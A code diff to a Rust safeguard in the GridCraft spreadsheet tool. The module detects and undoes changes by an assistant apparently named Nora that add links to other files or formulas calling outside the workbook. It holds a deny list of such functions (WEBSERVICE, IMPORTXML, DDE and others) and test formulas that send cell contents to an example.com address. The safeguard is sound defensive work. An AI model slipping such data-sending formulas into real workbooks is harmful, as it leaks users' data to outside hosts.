@@ -14,26 +14,37 @@
 //! - a `HYPERLINK` formula whose target is not written out as a web page, an e-mail address or `#` and
 //!   a place of the workbook (a target computed from cells or texts is not read, so it is refused), or
 //!   `HYPERLINK` passed bare to a function (`MAP(…, HYPERLINK)`);
-//! - a formula that calls outside the workbook when Excel computes it: `WEBSERVICE`, `IMAGE`, `RTD`,
-//!   `CALL`, `REGISTER`, `REGISTER.ID`, or that reads another file (a sheet named with `[`, `]`, `\`, `/`,
-//!   `:`, `?` or `*`, which no sheet of a workbook can be);
+//! - a formula that calls outside the workbook when Excel computes it (`WEBSERVICE`, `IMAGE`, `RTD`,
+//!   `CALL`, `REGISTER`, `REGISTER.ID`), when LibreOffice does (`DDE`) or Google Sheets (`IMPORTXML`,
+//!   `IMPORTHTML`, `IMPORTDATA`, `IMPORTFEED`, `IMPORTRANGE`: a saved workbook is opened there too), or
+//!   that reads another file (a sheet named with `[`, `]`, `\`, `/`, `:`, `?` or `*`, which no sheet of a
+//!   workbook can be);
+//! - a place of the workbook (`#…`, or a link the file saves as a place) that names another file
+//!   (`#[Book.xlsx]Sheet1!A1`): Excel opens that file;
 //! - a formula GridCraft cannot read that holds one of those, a `|` (a DDE call to a program) or a `[`.
 //!
-//! The cells, the defined names and the data validations are read. What was already there (the
-//! person's own links, moved or not) is counted, not refused: only a change that adds to it is.
+//! The cells, the defined names, the data validations, the conditional formats, the tables' calculated
+//! columns, the charts' series and the pivot tables' sources and calculated fields are read. What was
+//! already there (the person's own links, moved or not) is counted, not refused: only a change that adds
+//! to it is.
 
 use std::collections::BTreeMap;
 
 use craft_nora::links;
 use gridcraft_engine::formula::{Expr, Reference, SheetSel};
-use gridcraft_engine::model::{Hyperlink, Sheet, Workbook};
+use gridcraft_engine::model::{CfRule, Hyperlink, Sheet, Workbook};
 
 /// The functions that reach outside the workbook when Excel computes them: a web service, a picture
 /// from an address, a program (real-time data, a function of a library).
-const OUTSIDE: &[&str] = &["WEBSERVICE", "IMAGE", "RTD", "CALL", "REGISTER", "REGISTER.ID"];
+const OUTSIDE: &[&str] =
+    &["WEBSERVICE", "IMAGE", "RTD", "CALL", "REGISTER", "REGISTER.ID", "DDE", "IMPORTXML", "IMPORTHTML", "IMPORTDATA", "IMPORTFEED", "IMPORTRANGE"];
 
 /// What no sheet name can hold: a reference on such a "sheet" is to another file.
 const NOT_IN_A_SHEET_NAME: &[char] = &['[', ']', '\\', '/', ':', '?', '*'];
+
+/// What a place of the workbook (`#Sheet2!A1`, `Total`) cannot hold and a place in another file does
+/// (`#[Book.xlsx]Sheet1!A1`, `#'\\srv\s\[x.xlsx]S'!A1`).
+const ANOTHER_FILE: &[char] = &['[', ']', '\\', '/'];
 
 /// The longest text of a target or a formula quoted back to Nora.
 const MAX_QUOTED_CHARS: usize = 200;
@@ -91,7 +102,7 @@ pub(super) fn refusal(what: &str, found: &[Reach]) -> String {
     format!(
         "{what} was undone, nothing of it is left: it wrote {}. A link of yours goes to a web page, an e-mail address or a place of the \
 workbook, never to a file; a formula of yours never calls outside the workbook (WEBSERVICE, IMAGE, RTD, CALL, REGISTER) nor reads \
-another file. Tell the person; do not look for another way to write it.",
+another file nor names a place in one. Tell the person; do not look for another way to write it.",
         listed.join("; ")
     )
 }
@@ -116,13 +127,51 @@ fn read_sheet(sheet: &Sheet, found: &mut Vec<Reach>) {
     }
     for (at, cell) in sheet.cells.iter() {
         if let Some(formula) = &cell.formula {
-            read_formula(formula.expr.as_deref(), &formula.text, &on(at.a1()), found);
+            // Parsed again when the workbook came from a file (the tree is not kept there), so that a formula is
+            // the same reach before and after the engine parses it.
+            let expr = formula.expr_arc();
+            read_formula(expr.as_deref(), &formula.text, &on(at.a1()), found);
         }
     }
+    let first = |ranges: &[gridcraft_engine::core::RangeRef]| on(ranges.first().map(|r| r.a1()).unwrap_or_default());
     for validation in &sheet.validations {
-        let place = format!("the validation of {}", on(validation.ranges.first().map(|r| r.a1()).unwrap_or_default()));
+        let place = format!("the validation of {}", first(validation.ranges.as_slice()));
         for text in std::iter::once(&validation.f1).chain(validation.f2.as_ref()) {
             read_text(text, &place, found);
+        }
+    }
+    for conditional in &sheet.cond_formats {
+        let place = format!("the conditional format of {}", first(conditional.ranges.as_slice()));
+        match &conditional.rule {
+            CfRule::CellIs { a, b, .. } => {
+                for text in std::iter::once(a).chain(b.as_ref()) {
+                    read_text(text, &place, found);
+                }
+            }
+            CfRule::Expression { formula, .. } => read_text(formula, &place, found),
+            _ => {}
+        }
+    }
+    for table in &sheet.tables {
+        for column in &table.columns {
+            if let Some(formula) = &column.formula {
+                read_text(formula, &format!("the column {} of the table {}", column.name, table.name), found);
+            }
+        }
+    }
+    for (at, chart) in sheet.charts.iter().enumerate() {
+        let place = format!("chart {} of {}", at + 1, gridcraft_engine::formula::quote_sheet(&sheet.name));
+        for text in chart.source.iter().chain(chart.series.iter().flat_map(|series| {
+            std::iter::once(&series.values).chain(series.name.as_ref()).chain(series.categories.as_ref()).chain(series.bubble_sizes.as_ref())
+        })) {
+            read_reference(text, &place, found);
+        }
+    }
+    for pivot in &sheet.pivots {
+        let place = format!("the pivot table {}", pivot.name);
+        read_reference(&pivot.source, &place, found);
+        for field in &pivot.calculated_fields {
+            read_text(&field.formula, &place, found);
         }
     }
 }
@@ -141,6 +190,18 @@ fn read_text(text: &str, place: &str, found: &mut Vec<Reach>) {
     }
     let expr = gridcraft_engine::formula::parse(body).ok();
     read_formula(expr.as_ref(), body, place, found);
+}
+
+/// A range a chart or a pivot table reads (`Sheet1!$B$2:$B$9`), or a series' literal name (`Ventes [CHF]`): read as
+/// a formula when GridCraft reads it as one; else by its text only when it reads as a reference (a `!`, or a `|`),
+/// so that a name with brackets is not taken for another file.
+fn read_reference(text: &str, place: &str, found: &mut Vec<Reach>) {
+    let body = text.trim().trim_start_matches('=');
+    match gridcraft_engine::formula::parse(body) {
+        Ok(expr) => read_formula(Some(&expr), body, place, found),
+        Err(_) if body.contains(['!', '|']) => read_formula(None, body, place, found),
+        Err(_) => {}
+    }
 }
 
 /// What a formula reaches outside the workbook: read in its syntax tree, or, for one GridCraft cannot
@@ -209,7 +270,11 @@ fn link_stays(link: &Hyperlink) -> bool {
     }
     let lower = target.to_ascii_lowercase();
     let address = link.external || target.contains("://") || lower.starts_with("mailto:") || target.starts_with("\\\\") || lower.starts_with("file:");
-    !address || links::web_or_mail(target)
+    if address {
+        return links::web_or_mail(target);
+    }
+    // Saved as a place of the workbook (`location`, without its `#`): no place of this workbook names another file.
+    !target.contains(ANOTHER_FILE)
 }
 
 /// Whether a `HYPERLINK` formula's written target is a web page, an e-mail address or `#` and a place
@@ -223,7 +288,7 @@ fn formula_target_stays(target: &str) -> bool {
         return false;
     }
     match target.strip_prefix('#') {
-        Some(place) => !place.contains("://"),
+        Some(place) => !place.contains("://") && !place.contains(ANOTHER_FILE),
         None => links::web_or_mail(target),
     }
 }
@@ -314,6 +379,8 @@ mod tests {
             ("=HYPERLINK(A1)", "a HYPERLINK formula whose target is not written out in quotes"),
             ("=WEBSERVICE(\"https://example.com/?\"&A1)", "WEBSERVICE, which calls outside the workbook"),
             ("=IMAGE(\"https://example.com/x.png\")", "IMAGE, which calls outside the workbook"),
+            ("=IMPORTXML(\"https://example.com\",\"//a\")", "IMPORTXML, which calls outside the workbook"),
+            ("=HYPERLINK(\"#[Book.xlsx]Sheet1!A1\")", "a HYPERLINK formula to #[Book.xlsx]Sheet1!A1"),
         ] {
             let found = typed(input);
             assert_eq!(found.len(), 1, "{input}: {found:?}");
@@ -334,6 +401,30 @@ mod tests {
         assert_eq!(found.len(), 1, "{found:?}");
         assert_eq!(found[0].what, "a link to C:\\Tarifs\\x.pdf");
         assert_eq!(found[0].place, "Sheet1!A3");
+        // A place in another workbook, which the file keeps as a place of this one: Excel opens that workbook.
+        s.execute("insert.link", json!({"cell": "A4", "target": "#[Book.xlsx]Sheet1!A1"})).unwrap();
+        let found = added(&before, &workbook(&s));
+        assert_eq!(found.len(), 2, "{found:?}");
+        assert_eq!(found[1].what, "a link to #[Book.xlsx]Sheet1!A1");
+    }
+
+    #[test]
+    fn the_formulas_a_workbook_keeps_beside_its_cells_are_read_too() {
+        let s = session();
+        let before = workbook(&s);
+        let mut wb = (*workbook(&s)).clone();
+        let mut sheet = (*wb.sheets[0]).clone();
+        let range = gridcraft_engine::core::RangeRef::parse("A1:A9").unwrap();
+        sheet.cond_formats.push(gridcraft_engine::model::CondFormat {
+            ranges: vec![range],
+            rule: CfRule::Expression { formula: "WEBSERVICE(\"https://example.com/?\"&A1)<>\"\"".into(), style: Box::default() },
+            priority: 1,
+            stop_if_true: false,
+        });
+        wb.sheets[0] = std::sync::Arc::new(sheet);
+        let found = added(&before, &wb);
+        assert_eq!(found.len(), 1, "{found:?}");
+        assert_eq!(found[0].place, "the conditional format of Sheet1!A1:A9");
     }
 
     #[test]
